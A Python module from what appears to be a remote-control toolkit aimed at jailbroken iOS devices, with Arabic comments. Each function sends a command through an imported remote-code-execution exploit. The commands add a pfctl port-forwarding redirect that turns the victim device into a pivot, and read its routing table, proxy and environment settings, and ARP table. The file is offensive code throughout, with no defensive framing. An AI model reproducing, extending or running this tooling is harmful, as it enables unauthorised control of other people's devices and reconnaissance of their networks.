import socket
from scapy.all import ARP
from rich.console import Console
from rich.prompt import Prompt, IntPrompt
from rce_exploit import RCEExploit

console = Console()

class NetworkCommands:
    @staticmethod
    def portfwd_add(ip, port, local_port, remote_port, remote_ip):
        """Add port forwarding rule."""
        try:
            # استبدال iptables بأمر pfctl المتوافق مع iOS (يتطلب Jailbreak)
            # في iOS العادي، يمكن استخدام تطبيقات VPN مع ملفات تكوين خاصة
            command = f"echo 'rdr pass inet proto tcp from any to any port {local_port} -> {remote_ip} port {remote_port}' | pfctl -ef -"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][Network] Port forwarding added: {local_port} -> {remote_ip}:{remote_port}[/bold green]")
                return {'status': 'success'}
            else:
                console.print(f"[bold red][Network] Failed to add port forwarding: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Network] Port forwarding error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def route(ip, port):
        """Display or manage network routing table."""
        try:
            # استبدال route/ip route بأمر netstat المتوافق مع iOS
            command = "netstat -nr"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][Network] Routing Table:[/bold green]\n{result['response']}")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][Network] Failed to display routing table: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Network] Routing table error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def check_proxy(ip, port):
        """Check for proxy settings."""
        try:
            # استبدال أمر grep بأمر scutil المتوافق مع iOS
            command = "env | grep -i proxy || scutil --proxy"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][Network] Proxy Settings:[/bold green]\n{result['response']}")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][Network] Failed to check proxy: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Network] Proxy check error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def arp(ip, port):
        """Display ARP table."""
        try:
            # أمر arp -a متوافق مع iOS، إضافة netstat كبديل
            command = "arp -a || netstat -p arp"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][Network] ARP Table:[/bold green]\n{result['response']}")
                return {'status': 'success', 'info': result['response']}
            else:
                console.print(f"[bold red][Network] Failed to display ARP table: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Network] ARP table error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}
